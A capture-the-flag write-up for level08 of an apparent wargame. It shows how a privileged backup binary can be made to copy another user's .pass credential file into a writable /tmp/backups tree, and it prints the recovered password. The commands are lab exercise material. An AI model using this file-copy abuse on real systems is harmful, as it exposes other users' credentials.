After opening the binary in dogbolt we can see that the program take a path in parameter and copy that file in a folder backup that has the same parent structure.
So if I want to copy `myfile`:
`/folder1/folder2/myfile`
There must be a folder `backups` containing `/folder1/folder2/` like:
`./backups/folder1/folder2/`
Where you are

Since we know that the binary has the permission to open `/home/users/level09/.pass`
We will try to copy the `.pass` file

```Shell
level08@OverRide:~$ ./level08 /home/users/level09/.pass
ERROR: Failed to open ./backups//home/users/level09/.pass
```

Here we see that it doesn't work because the `/home/users/level0` folder are missing in the `./backups` folder.
So we will try to use the command in the `/tmp` directory so that we can create the `./backups/home/users/level0` folders.

```Shell
level08@OverRide:~$ cd /tmp
level08@OverRide:/tmp$ ~/level08 /home/users/level09/.pass
ERROR: Failed to open ./backups//home/users/level09/.pass
level08@OverRide:/tmp$ mkdir -p backups/home/users/level09
level08@OverRide:/tmp$ ~/level08 /home/users/level09/.pass
level08@OverRide:/tmp$ cat backups/home/users/level09/.pass
fjAwpJNs2vvkFLRebEvAQ2hFZ4uQBWfHRsP62d8S
```
